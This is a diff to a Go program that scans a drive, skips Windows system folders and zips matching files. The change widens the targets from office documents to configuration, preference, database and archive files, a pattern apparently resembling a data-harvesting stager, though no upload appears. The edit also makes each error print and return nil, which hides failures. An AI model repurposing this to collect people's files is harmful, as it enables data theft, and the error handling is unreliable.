@@ -62,20 +62,23 @@ func zipFiles(zipName string, files []string) error {
 	for _, file := range files {
 		fileToZip, err := os.Open(file)
 		if err != nil {
-			return err
+			fmt.Printf("Error opening file %s: %v", file, err.Error())
+			return nil
 		}
 		defer fileToZip.Close()
 
 		// Get the file information
 		info, err := fileToZip.Stat()
 		if err != nil {
-			return err
+			fmt.Printf("Error getting file info of %s: %v", file, err.Error())
+			return nil
 		}
 
 		// Create a new file header
 		header, err := zip.FileInfoHeader(info)
 		if err != nil {
-			return err
+			fmt.Printf("Error creating file header for %s: %v", file, err.Error())
+			return nil
 		}
 
 		// Set the file name to preserve directory structure
@@ -84,12 +87,14 @@ func zipFiles(zipName string, files []string) error {
 		// Add the file header to the zip archive
 		writer, err := zipWriter.CreateHeader(header)
 		if err != nil {
-			return err
+			fmt.Printf("Error creating file header for %s: %v", file, err.Error())
+			return nil
 		}
 
 		// Write the file content to the zip archive
 		if _, err := io.Copy(writer, fileToZip); err != nil {
-			return err
+			fmt.Printf("Error copying file %s to zip: %v", file, err.Error())
+			return nil
 		}
 	}
 
@@ -107,7 +112,7 @@ func main() {
 
 	start := time.Now()
 
-	includedExts := []string{".doc", ".docx", ".pdf", ".odt", ".rtf", ".txt", ".ppt", ".pptx", ".odp", ".xls", ".xlsx", ".ods"}
+	includedExts := []string{".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp", ".csv", ".tsv", ".html", ".xml", ".json", ".yaml", ".md", ".tex", ".cfg", ".conf", ".properties", ".prefs", ".plist", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".cue", ".bin", ".dat", ".db", ".sqlite", ".dbf", ".mdb", ".accdb", ".sql", ".tab", ".tsv", ".dbf", ".dif"}
 	excludedDirectories := []string{"temp", "windows", "node_modules", "program files", "programdata", "microsoftteams", "perflogs", "$recycle.bin", "system volume information", "c:\recovery", "cachestorage", "appdata\\local\\packages"}
 
 	files, err := listFiles(root, includedExts, excludedDirectories)
